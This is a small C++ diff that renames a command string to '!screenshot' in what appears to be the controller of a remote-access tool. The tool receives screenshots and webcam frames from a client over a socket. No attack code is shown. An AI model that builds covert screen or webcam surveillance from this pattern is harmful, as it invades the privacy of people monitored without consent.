@@ -119,7 +119,7 @@ int main() {
             std::vector<char> imageData = receiveImageData(clientSocket);
             if (!imageData.empty()) {
                 std::string filename;
-                if (strcmp(sendBuffer, "screen capture") == 0) {
+                if (strcmp(sendBuffer, "!screenshot") == 0) {
                     filename = "screenshot.jpg";
                 } else {
                     // Create filename with timestamp for webcam frames
